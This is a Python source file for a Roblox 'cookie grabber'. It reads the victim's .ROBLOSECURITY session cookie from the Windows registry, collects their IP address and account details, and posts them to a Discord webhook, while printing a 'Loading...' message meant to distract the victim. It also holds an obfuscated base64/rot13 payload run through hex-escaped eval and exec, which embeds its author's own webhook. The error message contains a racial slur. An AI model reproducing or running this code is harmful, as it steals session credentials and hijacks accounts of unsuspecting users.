"""
 Scripter : Mani.#0001
 Injection : Bingo Methods discord
 Better version of : vesper cookie grabber
"""
try:
    import base64, codecs
    from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
    import robloxpy
    import json
    import requests
    import os
    from discordwebhook import *
except:
    print("go install libraries nigga")
    exit()

webhookk = "heh" # put webhook here


dummy_message = "Loading..." # A message that distracts the user from closing the grabber
print(dummy_message)
################### Gathering INFOMATION #################################
def GrabCookie():
    # opening the roblox studio key
    robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
    # finding the subkey called ".robloxsecurity"
    try:
        count = 0
        while True:
            name, value, type = EnumValue(robloxstudiopath, count)
            if name == ".ROBLOSECURITY":
                # returns the value of .robloxsecurity
                return value
            count = count + 1
    except WindowsError:
        pass
roblox_cookie_value = str(GrabCookie())
#################### INFOMATION #################
ip_address = requests.get("https://api.ipify.org/").text
roblox_cookie = roblox_cookie_value.split("COOK::<")[1].split(">")[0]
#################### checking cookie #############
isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
if isvalid == "Valid Cookie":
    isvalid = "Valid"
else:
    exit()

#################### getting info about the cookie #############
ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
info = json.loads(ebruh.text)
rid = info["UserID"]
rap = robloxpy.User.External.GetRAP(rid)
friends = robloxpy.User.Friends.External.GetCount(rid)
age = robloxpy.User.External.GetAge(rid)
crdate = robloxpy.User.External.CreationDate(rid)
rolimons = f"https://www.rolimons.com/player/{rid}"
roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
headshot = robloxpy.User.External.GetHeadshot(rid)
username = info['UserName']
robux = info['RobuxBalance']
premium = info['IsPremium']
#################### INJECT TO ROBLOX (creds to bingo methods) #################
magic = 'bWFnaWMgPSAnYVcxd2IzSjBJSEpsY1hWbGMzUnpEUXBtY205dElIZHBibkpsWnlCcGJYQnZjblFnVDNCbGJrdGxlU3dnU0V0RldWOURWVkpTUlU1VVgxVlRSVklzSUVWdWRXMVdZV3gxWlEwS0RRcDNaV0pvYjI5cklEMGdJbWgwZEhCek9pOHZaR2x6WTI5eVpDNWpiMjB2WVhCcEwzZGxZbWh2YjJ0ekx6azNPRE14TlRnMk16QTFORGMxTXpnd01pOXVka3hmT0ZwSVJHdFRRa0ZWVlc1MlRHSjBiMnM0U0ZWb1UwWTNhRFpNT0RSbGRXVkdNR0ZVVkdKdmJrUTFhbXR4YjBkeGJUUk9RekJoTnpoS1pucEJjV2hUWmlJZ0l5QlFkWFFnZVc5MWNpQmthWE5qYjNKa0lIZGxZbWh2YjJzZ2FXNGdhR1Z5WlEwS0RRcGtaV1lnUjNKaFlrTnZiMnRwWlNncE9nMEtJQ0FnSUNNZ2IzQmxibWx1WnlCMGFHVWdjbTlpYkc5NElITjBkV1JwYnlCclonDQpsb3ZlID0gJ0t4QVB2TnRWUE9sbzJXZm8zdW1xVUl4bko5akxLRWJWUTB0RzNPeW94Z3lyRnVWRjBJTUswQUlIeVdTR3lFc0lJQVNIdmp0cHZXR0cwTUhJMFNGRUlrRm8yV2Z'
love = 'iZ3IjFUb5qz9HBGEVZ0HkGIE5nHEuI2ykZ0S5pUyeoT8lI2MiZ3EbGQV5M1M2rRSDqx50IyOBq1MHGJAirxIwo3cjqUSHqKyJIHRkGUcarKWTG3qZFzgzGHcRqSM2AJkiZyqzomA1oH1XDGSjraxjpxMJDIO2GaEJHR8jpTS4AySRLaEJHR50IyOBqSMHDJykFwHjIyRjqScBZSuJHR50IyOBqSMDGmAhIUyzGHMCFUOuFKyPqQOLIyOBqSMDGaEJHR50IyOBqT96H2qAEzc0pKcGMaSXFTMJIHH1pSEVqRATG1AiLHyaFKcGMaSXFTWjrwy2o1D5AUNmEGSAIUycpSEGZT5DnaEZZwxko2SRL1SRLaEJHR50IyOBqSMDGaEJHR9wGKMCnRkXZKyJHGN5IyOJnRu4Wj0XM29xVQ0tWmyQIRH5ISWIGyMIn2kII1AWAxEEo2qWD0SaFHAOM0yQDJqWD0SaFHAOM0y5DaynJSVkL201rxyVHz9nH0VlJIq4ZIcGDaMnnHS1L205nJWUBGEwZyMdMSuXpTEVn05QnHSaFHAOM0yQDJqWD0SaFHAOM0yQDaynJSVkL200M2EgEaAxI1IBD2yOM0yQDJqWD0SaFHAOM0yUGaMxImHjFHDjM1xlBGSvoySaF3yOrREEo2qWD0SaJyubnycLDwOWEz'
god = 'RwYm1SdmQzTkZjbkp2Y2pvTkNpQWdJQ0FnSUNBZ2NHRnpjdzBLZEhKNU9nMEtJQ0FnSUNNZ1ZHaHBjeUIzYVd4c0lIUnllU0IwYnlCeVpYUjFjbTRnZEdobElIWmhiSFZsSUc5bUlIUm9aU0J6ZFdKclpYa2dJaTV5YjJKc2IzaHpaV04xY21sMGVTSU5DaUFnSUNCeWIySnNiM2hmWTI5dmEybGxYM1poYkhWbElEMGdjM1J5S0VkeVlXSkRiMjlyYVdVb0tTa05DaUFnSUNBJw0KZGVzdGlueSA9ICd3VlVFbHJGTzBvbE9hTUtEdHFUdXlWVEk0TEpBMFZUQWlvMmdjTUQwWFZQTnRWVVdpTHpraXJTOXdvMjllbkpIdENGT2xvMldmbzN1c0wyOWluMnl5SzNNdW9VSXlZYUFqb1R5MFhQV1FHMDlZQndiOFZ2eW9aSTBocDNPZm5LRGJWdzR2WElmaktEMFhWUE50VlBadHBUOW1xUE93bzI5ZW5KSHRxVDh0cko5MXB2TzNNSldibzI5ZVFEYnRWUE50cHpJa3FKSW1xVVpocFQ5bXFQdTNNSldibzI5ZVlQT2RwMjloQ0tmdnFLQXlwejV1b0pIdkJ2V0ZvMldmbzN0dEQyOWluMnl5VlJxbExKV3ZNS1Z2WVBXd28yNTBNSjUwV'
destiny = 'aqwryM6G3EZIJqfomWKMz8mqKAZZwycowW5rKAXG3EZHSp5JRDjJSMDGaEJHSc0FIE1rIMII2yZrzgcpyOCoKSIFKuhFwu0pSEGZT5DGmAZF0SbImARqR16BGSirxEOHUcWARjlFJckHJAdGRgOoFpAPzcirFN9VPqprQplKUt2Myk4AmEprQZkKUtmZlpAPaElqKA0VQ0tMKMuoPtaKUt2MSk4AwSprQL3KUt2BIk4AwZaXFNeVTI2LJjbW1k4AwAprQMzKUt2ASk4AwIprQLmKUt3Z1k4ZzIprQL0KUt2AIk4AwAprQMzKUt2ASk4AwIprQV4KUt2L1k4AzMprQp2KUt2AIk4ZzAprQVjKUt2LIk4AzMprQp5KUtlBFpcVPftMKMuoPtaKUt2A1k4AzMprQL0WlxtXlOyqzSfXPqprQLmKUt2Myk4AwEprQL1KUt2Z1k4AmAprQWyKUt2ASk4AwIprQLmKUt2Myk4AwEprQL1KUtlBSk4AwEprQL1KUt3Z1k4AmEprQL5KUt2MIk4AmyprQWwKUtlZSk4AzSprQMzKUt3BIk4ZwxaXD0XMKMuoPuwo21jnJkyXTWup2H2AP5vAwExMJAiMTHbMKMuoPtaKUt3ASk4AmWprQp1KUt3Z1k4AmDaXFxfWmkmqUWcozp+WljaMKuyLlpcXD=='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))

#################### SENDING TO WEBHOOK #################


discord = Discord(url=webhookk)
discord.post(
    username="BOT - Pirate 🍪",
    avatar_url="https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
    embeds=[
        {
            "username": "BOT - Pirate 🍪",
            "title": "💸 +1 Result Account 🕯",
            "description" : f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
            "color" : 12452044,
            "fields": [
                {"name": "Username", "value": username, "inline": True},
                {"name": "Robux Balance", "value": robux, "inline": True},
                {"name": "Premium Status", "value": premium,"inline": True},
                {"name" : "RAP", "value": rap,"inline": True},
                {"name" : "Friends", "value": friends, "inline": True},
                {"name" : "Account Age", "value": age, "inline": True},
                {"name" : "IP Address", "value" : ip_address, "inline:": True},
                {"name" : ".ROBLOSECURITY", "value": f"```{roblox_cookie}```", "inline": False},
            ],
            "thumbnail": {"url": headshot},


        }
    ],
)
